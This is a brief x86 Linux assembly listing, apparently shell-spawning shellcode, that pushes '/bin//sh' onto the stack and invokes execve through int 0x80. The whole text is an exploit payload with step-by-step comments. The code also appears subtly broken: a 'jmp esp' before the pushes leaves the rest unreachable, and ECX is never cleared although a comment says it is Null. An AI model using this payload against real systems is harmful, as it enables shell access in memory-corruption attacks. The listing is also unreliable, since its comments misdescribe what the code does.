[SECTION .text]
global _start
_start:

xor edx,edx ; edx = 0 (it will be used as *envp = NULL)
xor eax,eax ; eax = 0 (it will be used as a null-terminating char)
sub esp,0x16
jmp esp
push eax
push 0x68732f2f
push 0x6e69622f ; here you got /bin//sh\x00 on the stack
mov ebx,esp ; ebx <- esp; ebx points to /bin//sh\x00
mov al, 0xb ; al = 0xb, 11, execve syscall id
int 0x80 ; execve("/bin//sh\x00",Null,Null)

